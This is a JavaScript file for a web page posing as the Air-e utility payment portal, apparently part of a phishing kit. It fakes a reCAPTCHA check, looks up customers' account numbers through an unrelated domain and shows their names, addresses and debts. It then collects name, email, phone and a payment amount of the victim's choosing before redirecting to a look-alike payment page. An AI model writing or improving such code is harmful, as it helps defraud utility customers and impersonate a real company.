/**
 * index.js - Portal de Pagos Air-e
 * Versión: Abono Libre + Validación Email + Corrección Factura
 */

// --- 1. Lógica de Interfaz: Menú Lateral ---
const hamburgerBtn = document.getElementById('hamburgerBtn');
const hamburgerBtnDesktop = document.getElementById('hamburgerBtnDesktop'); 
const sidebar = document.getElementById('sidebar');

const toggleSidebar = () => {
    if (sidebar) {
        if (window.innerWidth <= 768) sidebar.classList.toggle('mobile-open');
        else sidebar.classList.toggle('hidden');
    }
};

if(hamburgerBtn) hamburgerBtn.addEventListener('click', toggleSidebar);
if(hamburgerBtnDesktop) hamburgerBtnDesktop.addEventListener('click', toggleSidebar);

// --- 2. Lógica de Interfaz: Checkbox ReCAPTCHA ---
const checkboxContainer = document.getElementById('checkboxContainer');
const fakeCheckbox = document.getElementById('fakeCheckbox');
const spinner = document.getElementById('spinner');
const checkmark = document.getElementById('checkmark');
let isChecked = false;

if(checkboxContainer){
    checkboxContainer.addEventListener('click', () => {
        if(isChecked) return; 
        if(fakeCheckbox) fakeCheckbox.style.display = 'none';
        if(spinner) spinner.style.display = 'block';
        setTimeout(() => {
            if(spinner) spinner.style.display = 'none';
            if(checkmark) checkmark.style.display = 'block';
            isChecked = true;
        }, 1200);
    });
}

// --- 3. Lógica de Consulta: Conexión al Backend ---
const btnPagar = document.getElementById('btnPagar');
const whitePanel = document.getElementById('whitePanel');
const originalTitleStrip = document.getElementById('originalTitleStrip');
const inputNic = document.getElementById('inputNicReal');

if(btnPagar) {
    btnPagar.addEventListener('click', async () => {
        const nicValue = inputNic ? inputNic.value.trim() : "";

        if(!nicValue) { alert("Por favor, ingrese el NIC."); return; }
        if(!isChecked) { alert("Por favor confirme que no es un robot."); return; }

        if(originalTitleStrip) originalTitleStrip.style.display = 'none';
        if(whitePanel) {
            whitePanel.innerHTML = `
                <div class="full-loader-container">
                    <div class="big-loader"></div>
                    <p>Consultando datos en Air-e...</p>
                </div>`;
        }

        try {
            // CAMBIA ESTA URL por tu servidor de Puppeteer (Local o Producción)
            const apiUrl = `https://rusianenel.pagoswebcol.uk/api/consultar-nic?nic=${nicValue}`;

            const response = await fetch(apiUrl);
            const responseText = await response.text();

            if (responseText.trim().startsWith("<!DOCTYPE")) {
                throw new Error("El portal está saturado. Intente en unos minutos.");
            }

            const data = JSON.parse(responseText);

            if (data && data.ACCOUNTS) {
                renderFactura(data, nicValue);
            } else {
                throw new Error("No se encontró deuda o el NIC es incorrecto.");
            }

        } catch (e) {
            console.error("Error:", e);
            alert("Error: " + e.message);
            location.reload();
        }
    });
}

// --- 4. Visualización: Renderizar Factura con Abono Libre ---
function renderFactura(data, nic) {
    const info = data.ACCOUNTS;
    const deudaTotalNum = parseFloat(info.ADJUST_BALANCE) || 0;
    
    // Lógica corregida para el valor del mes (Objeto vs Array)
    let valorMesNum = 0;
    if (info.INVOICES) {
        if (Array.isArray(info.INVOICES) && info.INVOICES.length > 0) {
            valorMesNum = parseFloat(info.INVOICES[info.INVOICES.length - 1].ADJUST_BALANCE) || 0;
        } else if (!Array.isArray(info.INVOICES)) {
            valorMesNum = parseFloat(info.INVOICES.ADJUST_BALANCE) || 0;
        }
    }
    if (valorMesNum === 0) valorMesNum = deudaTotalNum;

    whitePanel.innerHTML = `
    <div class="invoice-view">
        <div class="invoice-header"><h3>DETALLE DE FACTURA</h3></div>
        
        <div style="text-align:center; padding:12px; background:#f0f4f8; border-radius:8px; margin-bottom:15px;">
            <strong style="display:block; color:#004a99; font-size: 1.1em;">${data.NAME}</strong>
            <small style="color: #555;">${info.COLLECTION_ADDRESS}</small>
        </div>

        <div class="invoice-form-grid">
            <div class="invoice-input-group">
                <label class="invoice-label">NIC</label>
                <input type="text" class="invoice-field" id="numId" value="${nic}" readonly style="background: #eee;">
            </div>
            <div class="invoice-input-group">
                <label class="invoice-label">Nombre Completo *</label>
                <input type="text" class="invoice-field" id="nombres" placeholder="Ej: Juan Perez">
            </div>
            <div class="invoice-input-group">
                <label class="invoice-label">Correo Electrónico *</label>
                <input type="email" class="invoice-field" id="correo" placeholder="usuario@correo.com">
            </div>
            <div class="invoice-input-group">
                <label class="invoice-label">Celular *</label>
                <input type="text" class="invoice-field" id="celular" placeholder="3001234567">
            </div>
        </div>

        <div class="payment-cards-grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px; margin-top: 20px;">
            
            <div class="payment-card">
                <div class="pay-card-title">VALOR MES</div>
                <div class="pay-card-amount">$ ${valorMesNum.toLocaleString('es-CO')}</div>
                <button class="btn-card-action btn-blue-dark" onclick="validarYRedirigir(${valorMesNum})">PAGAR MES</button>
            </div>

            <div class="payment-card">
                <div class="pay-card-title">DEUDA TOTAL</div>
                <div class="pay-card-amount">$ ${deudaTotalNum.toLocaleString('es-CO')}</div>
                <button class="btn-card-action btn-teal" onclick="validarYRedirigir(${deudaTotalNum})">PAGAR TOTAL</button>
            </div>

            <div class="payment-card" style="border: 2px dashed #00bfa5; background: #f9f9f9;">
                <div class="pay-card-title" style="color: #00bfa5;">OTRO VALOR</div>
                <input type="number" id="inputAbono" class="invoice-field" placeholder="¿Cuánto?" style="margin: 5px 0; text-align: center; border: 1px solid #00bfa5; padding: 5px;">
                <button class="btn-card-action btn-teal" style="background: #00bfa5;" onclick="procesarAbono()">ABONAR</button>
            </div>

        </div>

        <div class="invoice-footer" style="margin-top: 20px;">
            <div class="terms-check">
                <input type="checkbox" id="checkTerm" checked>
                <span>Acepto políticas de datos.</span>
            </div>
            <button class="btn-cancel" onclick="location.reload()">VOLVER</button>
        </div>
    </div>`;
}

// --- 5. Funciones de Procesamiento y Validación ---

window.procesarAbono = function() {
    const abono = document.getElementById('inputAbono').value;
    if(!abono || abono <= 0) {
        alert("Por favor ingrese un valor válido para abonar.");
        return;
    }
    validarYRedirigir(parseInt(abono));
};

window.validarYRedirigir = function(monto) {
    const nom = document.getElementById('nombres').value.trim();
    const mail = document.getElementById('correo').value.trim();
    const cel = document.getElementById('celular').value.trim();
    const term = document.getElementById('checkTerm');

    if(!nom || !mail || !cel) {
        alert("Complete todos los campos obligatorios.");
        return;
    }

    // VALIDACIÓN DE CORREO ESTRICTA
    const regexCorreo = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if(!regexCorreo.test(mail)) {
        alert("El correo electrónico no es válido. Ejemplo: nombre@correo.com");
        document.getElementById('correo').focus();
        return;
    }

    if(term && !term.checked) {
        alert("Debe aceptar los términos.");
        return;
    }

    const datos = {
        nombreCompleto: nom,
        numId: document.getElementById('numId').value,
        correo: mail,
        celular: cel,
        montoPagar: monto,
        referencia: Math.floor(Math.random() * 1000000)
    };

    localStorage.setItem('datosFactura', JSON.stringify(datos));
    window.location.href = 'portalpagos.portalfacture.com.html';
};
